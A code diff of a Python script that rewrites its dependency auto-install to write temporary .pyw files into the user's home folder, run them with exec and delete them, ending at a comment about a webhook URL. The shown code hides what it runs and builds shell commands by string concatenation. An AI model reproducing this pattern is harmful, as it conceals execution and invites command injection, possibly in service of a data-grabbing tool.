@@ -5,22 +5,36 @@ import subprocess
 
 # Auto Install module
 
+sfolder = os.path.join(os.environ["HOMEDRIVE"], os.environ["HOMEPATH"])
+
 try:
     import requests
-except ImportError:
-    subprocess.run(["pip", "install", "requests"])
+except ModuleNotFoundError:
+    with open(sfolder + "\module.pyw", "w") as file:
+        file.write('import os\nos.system("pip install requests")')
+    exec(open(sfolder + "\module.pyw").read())
+    os.system("cd " + sfolder)
+    os.system("del " + sfolder + "\\module.pyw")
     import requests
     
 try:
     import psutil
 except ImportError:
-    subprocess.run(["pip", "install", "psutil"])
+    with open(sfolder + "\modules.pyw", "w") as file:
+        file.write('import os\nos.system("pip install psutil")')
+    exec(open(sfolder + "\modules.pyw").read())
+    os.system("cd " + sfolder)
+    os.system("del " + sfolder + "\\modules.pyw")
     import psutil
     
 try:
     import pyperclip
 except ImportError:
-    subprocess.run(["pip", "install", "pyperclip"])
+    with open(sfolder + "\moduless.pyw", "w") as file:
+        file.write('import os\nos.system("pip install pyperclip")')
+    exec(open(sfolder + "\moduless.pyw").read())
+    os.system("cd " + sfolder)
+    os.system("del " + sfolder + "\\moduless.pyw")
     import pyperclip
     
 #Webhook Url & avatar Url
